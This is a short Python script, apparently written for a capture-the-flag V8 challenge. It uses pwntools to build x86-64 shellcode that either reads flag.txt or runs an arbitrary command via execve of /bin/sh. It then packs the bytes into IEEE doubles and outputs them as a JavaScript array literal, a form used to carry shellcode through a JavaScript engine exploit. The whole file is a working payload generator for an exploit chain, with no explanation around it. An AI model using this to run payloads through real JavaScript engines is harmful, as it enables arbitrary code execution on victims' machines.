#!/usr/bin/env python3
"""Emit a JS array literal of doubles packing x86-64 shellcode.
usage: _z_v8_sc.py [cmd] [mode]
 mode 'cat'  -> simple open/read/write of flag.txt (short)
 mode 'sh'   -> execve("/bin/sh","-c",cmd)
"""
import struct, sys
from pwn import asm, shellcraft, context

context.clear(arch='amd64', os='linux')

mode = sys.argv[2] if len(sys.argv) > 2 else 'sh'
cmd = sys.argv[1] if len(sys.argv) > 1 else "cat flag.txt /flag.txt /flag 2>/dev/null; ls -la"

if mode == 'cat':
    sc = asm(shellcraft.cat('flag.txt'))
else:
    sc  = asm(shellcraft.pushstr(cmd, append_null=True))
    sc += asm("mov rbx, rsp")
    sc += asm(shellcraft.pushstr("-c", append_null=True))
    sc += asm("mov rcx, rsp")
    sc += asm(shellcraft.pushstr("/bin/sh"))
    sc += asm("mov rdi, rsp")
    sc += asm("""
        xor edx, edx
        push rdx
        push rbx
        push rcx
        push rdi
        mov rsi, rsp
        xor edx, edx
        mov eax, 59
        syscall
        mov eax, 60
        xor edi, edi
        syscall
    """)

while len(sc) % 8 != 0:
    sc += b"\x90"

vals = []
for i in range(0, len(sc), 8):
    vals.append(repr(struct.unpack("<d", sc[i:i+8])[0]))

sys.stderr.write("shellcode bytes: %d, doubles: %d\n" % (len(sc), len(vals)))
sys.stdout.write(", ".join(vals))
